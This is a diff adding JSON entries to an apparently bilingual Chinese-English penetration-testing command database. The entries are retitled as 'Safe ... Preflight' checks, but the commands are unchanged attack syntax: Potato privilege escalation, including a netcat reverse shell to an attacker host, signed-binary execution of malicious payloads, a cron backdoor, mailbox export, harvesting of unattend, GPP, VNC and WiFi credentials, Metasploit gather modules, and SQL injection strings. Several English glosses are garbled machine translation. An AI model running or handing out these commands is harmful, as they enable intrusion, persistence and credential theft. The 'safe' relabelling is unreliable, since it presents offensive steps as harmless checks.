+            "en": "Remove narrative-only text or repair lab placeholders while preserving reproducible Safe Potato-Tool Capability Preflight syntax; record authorization, rollback, and blue-team evidence during execution."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "-cmd",
+              "explanation": {
+                "zh": "以SYSTEM权限执行的命令",
+                "en": "with SYSTEM Permission Execute Command"
+              },
+              "type": "parameter"
+            },
+            {
+              "part": "GodPotato.exe",
+              "explanation": {
+                "zh": "全版本兼容的Potato提权工具",
+                "en": "Universal Potato Privilege Escalation Tool"
+              },
+              "type": "command"
+            }
+          ],
+          "platform": "windows",
+          "requiresAdmin": false
+        },
+        {
+          "area": "execution",
+          "index": 5,
+          "expectedCommand": "# 攻击机 - 启动socat重定向\nsocat tcp-listen:135,reuseaddr,fork tcp:target_ip:9999\n\n# 目标机 - 执行RoguePotato\nRoguePotato.exe -r attacker_ip -e \"cmd /c whoami > C:\\temp\\proof.txt\" -l 9999\n\n# 或使用netcat反弹\nRoguePotato.exe -r attacker_ip -e \"C:\\temp\\nc.exe attacker_ip 4444 -e cmd.exe\" -l 9999",
+          "command": "socat tcp-listen:135,reuseaddr,fork tcp:target_ip:9999\nRoguePotato.exe -r attacker_ip -e \"cmd /c whoami > C:\\temp\\proof.txt\" -l 9999\nRoguePotato.exe -r attacker_ip -e \"C:\\temp\\nc.exe attacker_ip 4444 -e cmd.exe\" -l 9999",
+          "title": {
+            "zh": "Potato 工具能力安全预检命令校正 6",
+            "en": "Safe Potato-Tool Capability Preflight Command Repair 6"
+          },
+          "description": {
+            "zh": "仅移除纯叙述或修正实验占位符，保留 Potato 工具能力安全预检 的可复现技术语法；执行时记录授权、回滚和蓝队证据。",
+            "en": "Remove narrative-only text or repair lab placeholders while preserving reproducible Safe Potato-Tool Capability Preflight syntax; record authorization, rollback, and blue-team evidence during execution."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "-r attacker_ip",
+              "explanation": {
+                "zh": "攻击机IP(运行OXID解析器)",
+                "en": "Attack Machine IP (Running OXID Resolver)"
+              },
+              "type": "parameter"
+            },
+            {
+              "part": "-l 9999",
+              "explanation": {
+                "zh": "本地监听端口",
+                "en": "Locallistening Port"
+              },
+              "type": "parameter"
+            },
+            {
+              "part": "-e",
+              "explanation": {
+                "zh": "要执行的命令",
+                "en": "Need Execute Command"
+              },
+              "type": "parameter"
+            }
+          ],
+          "platform": "windows",
+          "requiresAdmin": false
+        },
+        {
+          "area": "execution",
+          "index": 6,
+          "expectedCommand": "# === 决策流程 ===\n# 1. whoami /priv 确认SeImpersonatePrivilege\n# 2. systeminfo 确认系统版本\n#\n# Windows Server 2012-2016 => JuicyPotato\n# Windows Server 2019 (1809之前) => JuicyPotato (需正确CLSID)\n# Windows 10/Server 2019+ => PrintSpoofer 或 GodPotato\n# Windows Server 2022 => GodPotato\n# 所有版本 => SweetPotato (自动选择)\n# 需要远程中继 => RoguePotato\n#\n# 常用CLSID查询: https://ohpe.it/juicy-potato/CLSID/",
+          "command": "Write-Output 'PAYLOADER_POTATO_ATTACK_REVIEW_7'",
+          "title": {
+            "zh": "Potato 工具能力安全预检命令校正 7",
+            "en": "Safe Potato-Tool Capability Preflight Command Repair 7"
+          },
+          "description": {
+            "zh": "仅移除纯叙述或修正实验占位符，保留 Potato 工具能力安全预检 的可复现技术语法；执行时记录授权、回滚和蓝队证据。",
+            "en": "Remove narrative-only text or repair lab placeholders while preserving reproducible Safe Potato-Tool Capability Preflight syntax; record authorization, rollback, and blue-team evidence during execution."
+          },
+          "syntaxBreakdown": [],
+          "platform": "windows",
+          "requiresAdmin": false
+        }
+      ]
+    },
+    {
+      "id": "evasion-signed-binary",
+      "patches": [
+        {
+          "area": "execution",
+          "index": 0,
+          "expectedCommand": "msbuild.exe malicious.csproj\n执行嵌入的C#代码\nC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe",
+          "command": "msbuild.exe malicious.csproj\nC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe",
+          "title": {
+            "zh": "签名二进制策略安全预检命令校正 1",
+            "en": "Safe Signed-Binary Policy Preflight Command Repair 1"
+          },
+          "description": {
+            "zh": "仅移除纯叙述或修正实验占位符，保留 签名二进制策略安全预检 的可复现技术语法；执行时记录授权、回滚和蓝队证据。",
+            "en": "Remove narrative-only text or repair lab placeholders while preserving reproducible Safe Signed-Binary Policy Preflight syntax; record authorization, rollback, and blue-team evidence during execution."
+          },
+          "syntaxBreakdown": [],
+          "platform": "windows",
+          "requiresAdmin": false
+        },
+        {
+          "area": "execution",
+          "index": 1,
+          "expectedCommand": "InstallUtil.exe /logfile= /LogToConsole=false /U malicious.dll\n执行.NET程序集\nC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe",
+          "command": "InstallUtil.exe /logfile= /LogToConsole=false /U malicious.dll\nC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe",
+          "title": {
+            "zh": "签名二进制策略安全预检命令校正 2",
+            "en": "Safe Signed-Binary Policy Preflight Command Repair 2"
+          },
+          "description": {
+            "zh": "仅移除纯叙述或修正实验占位符，保留 签名二进制策略安全预检 的可复现技术语法；执行时记录授权、回滚和蓝队证据。",
+            "en": "Remove narrative-only text or repair lab placeholders while preserving reproducible Safe Signed-Binary Policy Preflight syntax; record authorization, rollback, and blue-team evidence during execution."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "/U",
+              "explanation": {
+                "zh": "卸载模式执行代码",
+                "en": "Unload Mode Execute Code"
+              },
+              "type": "parameter"
+            },
+            {
+              "part": "malicious.dll",
+              "explanation": {
+                "zh": "恶意.NET程序集",
+                "en": "Malicious .NET Assembly"
+              },
+              "type": "path"
+            }
+          ],
+          "platform": "windows",
+          "requiresAdmin": false
+        },
+        {
+          "area": "execution",
+          "index": 2,
+          "expectedCommand": "regsvcs.exe malicious.dll\nregasm.exe malicious.dll\n执行.NET程序集",
+          "command": "regsvcs.exe malicious.dll\nregasm.exe malicious.dll",
+          "title": {
+            "zh": "签名二进制策略安全预检命令校正 3",
+            "en": "Safe Signed-Binary Policy Preflight Command Repair 3"
+          },
+          "description": {
+            "zh": "仅移除纯叙述或修正实验占位符，保留 签名二进制策略安全预检 的可复现技术语法；执行时记录授权、回滚和蓝队证据。",
+            "en": "Remove narrative-only text or repair lab placeholders while preserving reproducible Safe Signed-Binary Policy Preflight syntax; record authorization, rollback, and blue-team evidence during execution."
+          },
+          "syntaxBreakdown": [],
+          "platform": "windows",
+          "requiresAdmin": false
+        }
+      ]
+    },
+    {
+      "id": "persistence-scheduled",
+      "patches": [
+        {
+          "area": "execution",
+          "index": 3,
+          "expectedCommand": "crontab -e\n添加: * * * * * /tmp/backdoor.sh\n或: @reboot /tmp/backdoor.sh",
+          "command": "crontab -e",
+          "title": {
+            "zh": "计划任务持久化安全核对命令校正 4",
+            "en": "Safe Scheduled-Task Persistence Review Command Repair 4"
+          },
+          "description": {
+            "zh": "仅移除纯叙述或修正实验占位符，保留 计划任务持久化安全核对 的可复现技术语法；执行时记录授权、回滚和蓝队证据。",
+            "en": "Remove narrative-only text or repair lab placeholders while preserving reproducible Safe Scheduled-Task Persistence Review syntax; record authorization, rollback, and blue-team evidence during execution."
+          },
+          "syntaxBreakdown": [],
+          "platform": "linux",
+          "requiresAdmin": false
+        }
+      ]
+    },
+    {
+      "id": "exchange-mailbox-access",
+      "patches": [
+        {
+          "area": "execution",
+          "index": 0,
+          "expectedCommand": "https://exchange.com/owa\n使用凭证登录OWA\n查看邮件、日历等",
+          "command": "https://exchange.com/owa",
+          "title": {
+            "zh": "Exchange 邮箱访问边界预检命令校正 1",
+            "en": "Exchange Mailbox-Access Boundary Preflight Command Repair 1"
+          },
+          "description": {
+            "zh": "仅移除纯叙述或修正实验占位符，保留 Exchange 邮箱访问边界预检 的可复现技术语法；执行时记录授权、回滚和蓝队证据。",
+            "en": "Remove narrative-only text or repair lab placeholders while preserving reproducible Exchange Mailbox-Access Boundary Preflight syntax; record authorization, rollback, and blue-team evidence during execution."
+          },
+          "syntaxBreakdown": [],
+          "platform": "all",
+          "requiresAdmin": false
+        },
+        {
+          "area": "execution",
+          "index": 1,
+          "expectedCommand": "使用Impacket:\npython exchanger.py domain/user:password@exchange.com\n或使用EWSTools",
+          "command": "python exchanger.py domain/user:password@exchange.com",
+          "title": {
+            "zh": "Exchange 邮箱访问边界预检命令校正 2",
+            "en": "Exchange Mailbox-Access Boundary Preflight Command Repair 2"
+          },
+          "description": {
+            "zh": "仅移除纯叙述或修正实验占位符，保留 Exchange 邮箱访问边界预检 的可复现技术语法；执行时记录授权、回滚和蓝队证据。",
+            "en": "Remove narrative-only text or repair lab placeholders while preserving reproducible Exchange Mailbox-Access Boundary Preflight syntax; record authorization, rollback, and blue-team evidence during execution."
+          },
+          "syntaxBreakdown": [],
+          "platform": "linux",
+          "requiresAdmin": false
+        },
+        {
+          "area": "execution",
+          "index": 2,
+          "expectedCommand": "配置Outlook连接Exchange\n使用MAPI协议访问邮箱\n支持邮件、日历、联系人",
+          "command": "Write-Output 'PAYLOADER_EXCHANGE_MAILBOX_ACCESS_REVIEW_3'",
+          "title": {
+            "zh": "Exchange 邮箱访问边界预检命令校正 3",
+            "en": "Exchange Mailbox-Access Boundary Preflight Command Repair 3"
+          },
+          "description": {
+            "zh": "仅移除纯叙述或修正实验占位符，保留 Exchange 邮箱访问边界预检 的可复现技术语法；执行时记录授权、回滚和蓝队证据。",
+            "en": "Remove narrative-only text or repair lab placeholders while preserving reproducible Exchange Mailbox-Access Boundary Preflight syntax; record authorization, rollback, and blue-team evidence during execution."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "OWA",
+              "explanation": {
+                "zh": "Outlook Web App",
+                "en": "Outlook Web App"
+              },
+              "type": "keyword"
+            },
+            {
+              "part": "EWS",
+              "explanation": {
+                "zh": "Exchange Web Services",
+                "en": "Exchange Web Services"
+              },
+              "type": "keyword"
+            },
+            {
+              "part": "MAPI",
+              "explanation": {
+                "zh": "Messaging API",
+                "en": "Messaging API"
+              },
+              "type": "keyword"
+            }
+          ],
+          "platform": "windows",
+          "requiresAdmin": false
+        },
+        {
+          "area": "execution",
+          "index": 3,
+          "expectedCommand": "PowerShell:\nNew-MailboxExportRequest -Mailbox user@domain.com -FilePath \"\\\\server\\share\\user.pst\"\n导出邮箱为PST文件",
+          "command": "PowerShell:\nNew-MailboxExportRequest -Mailbox user@domain.com -FilePath \"\\\\server\\share\\user.pst\"",
+          "title": {
+            "zh": "Exchange 邮箱访问边界预检命令校正 4",
+            "en": "Exchange Mailbox-Access Boundary Preflight Command Repair 4"
+          },
+          "description": {
+            "zh": "仅移除纯叙述或修正实验占位符，保留 Exchange 邮箱访问边界预检 的可复现技术语法；执行时记录授权、回滚和蓝队证据。",
+            "en": "Remove narrative-only text or repair lab placeholders while preserving reproducible Exchange Mailbox-Access Boundary Preflight syntax; record authorization, rollback, and blue-team evidence during execution."
+          },
+          "syntaxBreakdown": [],
+          "platform": "windows",
+          "requiresAdmin": false
+        }
+      ]
+    },
+    {
+      "id": "unattended-creds",
+      "patches": [
+        {
+          "area": "execution",
+          "index": 1,
+          "expectedCommand": "# CMD方式\ndir /s /b C:\\*unattend*.xml C:\\*sysprep*.xml 2>nul\n\n# PowerShell方式\nGet-ChildItem -Path C:\\ -Recurse -Include \"*unattend*\",\"*sysprep*\",\"*autounattend*\" -ErrorAction SilentlyContinue | Select-Object FullName",
+          "command": "dir /s /b C:\\*unattend*.xml C:\\*sysprep*.xml 2>nul\nGet-ChildItem -Path C:\\ -Recurse -Include \"*unattend*\",\"*sysprep*\",\"*autounattend*\" -ErrorAction SilentlyContinue | Select-Object FullName",
+          "title": {
+            "zh": "无人值守凭证文件安全核对命令校正 2",
+            "en": "Safe Unattended-Credential File Review Command Repair 2"
+          },
+          "description": {
+            "zh": "仅移除纯叙述或修正实验占位符，保留 无人值守凭证文件安全核对 的可复现技术语法；执行时记录授权、回滚和蓝队证据。",
+            "en": "Remove narrative-only text or repair lab placeholders while preserving reproducible Safe Unattended-Credential File Review syntax; record authorization, rollback, and blue-team evidence during execution."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "Get-ChildItem -Recurse",
+              "explanation": {
+                "zh": "PowerShell递归搜索",
+                "en": "Power Shellrecursive Search"
+              },
+              "type": "command"
+            },
+            {
+              "part": "-Include",
+              "explanation": {
+                "zh": "按通配符模式匹配文件名",
+                "en": "Match filenames by wildcard pattern"
+              },
+              "type": "parameter"
+            },
+            {
+              "part": "-ErrorAction SilentlyContinue",
+              "explanation": {
+                "zh": "忽略权限不足等错误",
+                "en": "Ignore insufficient-permission errors"
+              },
+              "type": "parameter"
+            }
+          ],
+          "platform": "windows",
+          "requiresAdmin": false
+        },
+        {
+          "area": "execution",
+          "index": 2,
+          "expectedCommand": "# 查看文件内容\ntype C:\\Windows\\Panther\\Unattend.xml\n\n# 关键字段搜索\nfindstr /i /c:\"Password\" /c:\"AutoLogon\" /c:\"AdminPassword\" C:\\Windows\\Panther\\Unattend.xml\n\n# PowerShell提取\n[xml]$xml = Get-Content C:\\Windows\\Panther\\Unattend.xml\n$xml.unattend.settings.component | Where-Object { $_.AutoLogon } | ForEach-Object { $_.AutoLogon.Password.Value }",
+          "command": "type C:\\Windows\\Panther\\Unattend.xml\nfindstr /i /c:\"Password\" /c:\"AutoLogon\" /c:\"AdminPassword\" C:\\Windows\\Panther\\Unattend.xml\n[xml]$xml = Get-Content C:\\Windows\\Panther\\Unattend.xml\n$xml.unattend.settings.component | Where-Object { $_.AutoLogon } | ForEach-Object { $_.AutoLogon.Password.Value }",
+          "title": {
+            "zh": "无人值守凭证文件安全核对命令校正 3",
+            "en": "Safe Unattended-Credential File Review Command Repair 3"
+          },
+          "description": {
+            "zh": "仅移除纯叙述或修正实验占位符，保留 无人值守凭证文件安全核对 的可复现技术语法；执行时记录授权、回滚和蓝队证据。",
+            "en": "Remove narrative-only text or repair lab placeholders while preserving reproducible Safe Unattended-Credential File Review syntax; record authorization, rollback, and blue-team evidence during execution."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "findstr /i /c:",
+              "explanation": {
+                "zh": "不区分大小写搜索指定字符串",
+                "en": "Explains the command segment used by this reviewed validation command."
+              },
+              "type": "command"
+            },
+            {
+              "part": "Password",
+              "explanation": {
+                "zh": "密码字段关键字",
+                "en": "Passwordfield Critical Character"
+              },
+              "type": "value"
+            },
+            {
+              "part": "AdminPassword",
+              "explanation": {
+                "zh": "管理员密码字段",
+                "en": "Management Member Passwordfield"
+              },
+              "type": "value"
+            },
+            {
+              "part": "AutoLogon",
+              "explanation": {
+                "zh": "自动登录配置(含明文密码)",
+                "en": "Auto-logon configuration (containing plaintext passwords)"
+              },
+              "type": "value"
+            },
+            {
+              "part": "[xml]$xml",
+              "explanation": {
+                "zh": "将XML文件解析为PowerShell XML对象",
+                "en": "will XML File Parse is PowerShell XML for Object"
+              },
+              "type": "command"
+            }
+          ],
+          "platform": "windows",
+          "requiresAdmin": false
+        },
+        {
+          "area": "execution",
+          "index": 3,
+          "expectedCommand": "# PowerShell解码Base64\n$encoded = \"QQBkAG0AaQBuAEAAMQAyADMA\"  # 从XML提取的编码值\n[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($encoded))\n\n# 或者使用certutil\necho QQBkAG0AaQBuAEAAMQAyADMA > C:\\temp\\encoded.txt\ncertutil -decode C:\\temp\\encoded.txt C:\\temp\\decoded.txt\ntype C:\\temp\\decoded.txt",
+          "command": "$encoded = \"QQBkAG0AaQBuAEAAMQAyADMA\"\n[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($encoded))\necho QQBkAG0AaQBuAEAAMQAyADMA > C:\\temp\\encoded.txt\ncertutil -decode C:\\temp\\encoded.txt C:\\temp\\decoded.txt\ntype C:\\temp\\decoded.txt",
+          "title": {
+            "zh": "无人值守凭证文件安全核对命令校正 4",
+            "en": "Safe Unattended-Credential File Review Command Repair 4"
+          },
+          "description": {
+            "zh": "仅移除纯叙述或修正实验占位符，保留 无人值守凭证文件安全核对 的可复现技术语法；执行时记录授权、回滚和蓝队证据。",
+            "en": "Remove narrative-only text or repair lab placeholders while preserving reproducible Safe Unattended-Credential File Review syntax; record authorization, rollback, and blue-team evidence during execution."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "[System.Text.Encoding]::Unicode",
+              "explanation": {
+                "zh": "UTF-16LE解码(Windows默认)",
+                "en": "UTF-16 LE Decoding (Windows Default)"
+              },
+              "type": "command"
+            },
+            {
+              "part": "FromBase64String",
+              "explanation": {
+                "zh": "Base64解码方法",
+                "en": "Explains the command segment used by this reviewed validation command."
+              },
+              "type": "command"
+            },
+            {
+              "part": "certutil -decode",
+              "explanation": {
+                "zh": "使用系统自带工具解码Base64",
+                "en": "Decode Base64 Using Built-in System Tools"
+              },
+              "type": "command"
+            }
+          ],
+          "platform": "windows",
+          "requiresAdmin": false
+        },
+        {
+          "area": "execution",
+          "index": 4,
+          "expectedCommand": "# 检查GPP(Group Policy Preferences)密码\nfindstr /S /I cpassword \\\\domain.com\\sysvol\\domain.com\\policies\\*.xml 2>nul\n\n# 检查IIS配置文件\ntype C:\\inetpub\\wwwroot\\web.config 2>nul | findstr /i \"connectionString password\"\n\n# 检查VNC密码文件\nreg query \"HKCU\\Software\\ORL\\WinVNC3\\Password\" 2>nul\nreg query \"HKLM\\SOFTWARE\\RealVNC\\WinVNC4\" /v Password 2>nul\n\n# 检查WiFi密码\nnetsh wlan show profiles\nnetsh wlan show profile name=\"目标WiFi\" key=clear",
+          "command": "findstr /S /I cpassword \\\\domain.com\\sysvol\\domain.com\\policies\\*.xml 2>nul\ntype C:\\inetpub\\wwwroot\\web.config 2>nul | findstr /i \"connectionString password\"\nreg query \"HKCU\\Software\\ORL\\WinVNC3\\Password\" 2>nul\nreg query \"HKLM\\SOFTWARE\\RealVNC\\WinVNC4\" /v Password 2>nul\nnetsh wlan show profiles\nnetsh wlan show profile name=\"{LAB_LABEL}WiFi\" key=clear",
+          "title": {
+            "zh": "无人值守凭证文件安全核对命令校正 5",
+            "en": "Safe Unattended-Credential File Review Command Repair 5"
+          },
+          "description": {
+            "zh": "仅移除纯叙述或修正实验占位符，保留 无人值守凭证文件安全核对 的可复现技术语法；执行时记录授权、回滚和蓝队证据。",
+            "en": "Remove narrative-only text or repair lab placeholders while preserving reproducible Safe Unattended-Credential File Review syntax; record authorization, rollback, and blue-team evidence during execution."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "cpassword",
+              "explanation": {
+                "zh": "GPP使用的AES加密密码字段(密钥已公开)",
+                "en": "GPP Use AES Encryption Passwordfield (key already public)"
+              },
+              "type": "value"
+            },
+            {
+              "part": "sysvol",
+              "explanation": {
+                "zh": "域控共享目录，所有域用户可读",
+                "en": "Domain controller shared directory, readable by all domain users"
+              },
+              "type": "value"
+            },
+            {
+              "part": "reg query",
+              "explanation": {
+                "zh": "查询注册表中的密码值",
+                "en": "Explains the command segment used by this reviewed validation command."
+              },
+              "type": "command"
+            }
+          ],
+          "platform": "windows",
+          "requiresAdmin": false
+        },
+        {
+          "area": "execution",
+          "index": 5,
+          "expectedCommand": "# Metasploit模块\nuse post/windows/gather/enum_unattend\nset SESSION 1\nrun\n\n# 也可以使用\nuse post/multi/gather/firefox_creds\nuse post/windows/gather/credentials/gpp\nuse post/windows/gather/cachedump",
+          "command": "use post/windows/gather/enum_unattend\nset SESSION 1\nrun\nuse post/multi/gather/firefox_creds\nuse post/windows/gather/credentials/gpp\nuse post/windows/gather/cachedump",
+          "title": {
+            "zh": "无人值守凭证文件安全核对命令校正 6",
+            "en": "Safe Unattended-Credential File Review Command Repair 6"
+          },
+          "description": {
+            "zh": "仅移除纯叙述或修正实验占位符，保留 无人值守凭证文件安全核对 的可复现技术语法；执行时记录授权、回滚和蓝队证据。",
+            "en": "Remove narrative-only text or repair lab placeholders while preserving reproducible Safe Unattended-Credential File Review syntax; record authorization, rollback, and blue-team evidence during execution."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "post/windows/gather/enum_unattend",
+              "explanation": {
+                "zh": "自动搜索并解析Unattend文件",
+                "en": "Automatic Search and Parse Unattend File"
+              },
+              "type": "value"
+            },
+            {
+              "part": "post/windows/gather/credentials/gpp",
+              "explanation": {
+                "zh": "提取GPP存储的凭证",
+                "en": "Extract GP Pstorage Credentials"
+              },
+              "type": "value"
+            }
+          ],
+          "platform": "windows",
+          "requiresAdmin": false
+        }
+      ]
+    },
+    {
+      "id": "custom-sql注入速查表",
+      "patches": [
+        {
+          "area": "execution",
+          "index": 0,
+          "expectedCommand": "## 基础\n' OR 1=1--\n' UNION SELECT 1,2,3--\n' AND SLEEP(5)--",
+          "command": "' OR 1=1--\n' UNION SELECT 1,2,3--\n' AND SLEEP(5)--",
+          "title": {
+            "zh": "SQL 注入只读测试预检命令校正 1",
+            "en": "Read-Only SQL Injection Test Preflight Command Repair 1"
+          },
+          "description": {
+            "zh": "仅移除纯叙述或修正实验占位符，保留 SQL 注入只读测试预检 的可复现技术语法；执行时记录授权、回滚和蓝队证据。",
+            "en": "Remove narrative-only text or repair lab placeholders while preserving reproducible Read-Only SQL Injection Test Preflight syntax; record authorization, rollback, and blue-team evidence during execution."
+          },
+          "syntaxBreakdown": [],
+          "platform": "all",
+          "requiresAdmin": false
+        }
+      ]
+    }
+  ]
+}
